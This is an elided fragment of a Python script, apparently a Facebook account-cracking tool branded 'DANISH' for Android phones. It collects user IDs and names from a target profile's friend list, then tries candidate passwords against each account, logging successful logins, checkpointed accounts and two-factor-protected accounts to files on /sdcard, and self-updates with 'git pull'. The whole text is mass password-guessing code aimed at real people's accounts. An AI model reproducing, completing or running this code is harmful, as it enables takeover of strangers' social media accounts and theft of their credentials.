...
def public_cloning():
        ...
        for ouqat in range(int(limit3)):
                ...
                try:
                        ...
                        DANISH = json.loads(sy)
                        for abbas in DANISH['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                id.append(bc+'\n')
...
def crackmbasic(idf,pwv):
        ...
        for pw in pwv:
                        ...
                        if "www.facebook.com" in r.text:
                                print(f'   \r {rp}[DANISH-CP] {idf} | {pw}{s}')     
                                open('/sdcard/DANISH_cp.txt','a').write(roid+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "session_key" in r.text:
                                ok+=1
                                print(f'   \r {rg}[DANISH-OK] {roid} | {pw}{s}')
                                open('/sdcard/DANISH_ok.txt','a').write(roid+'|'+pw+'\n')
                                break
                        elif "SMS shortly" in r.text:
                                print(f'   \r {rc}[DANISH-2F] {idf} | {pw}{s}')
                                open('/sdcard/DANISH_2f.txt','a').write(roid+'|'+pw+'\n')
                                break
                        else:
                                continue
        loop+=1
...
if not os.path.exists("//sdcard/DANISH.py.txt"):
        os.system("git pull")
        caseher()
else:
        os.system("git pull")
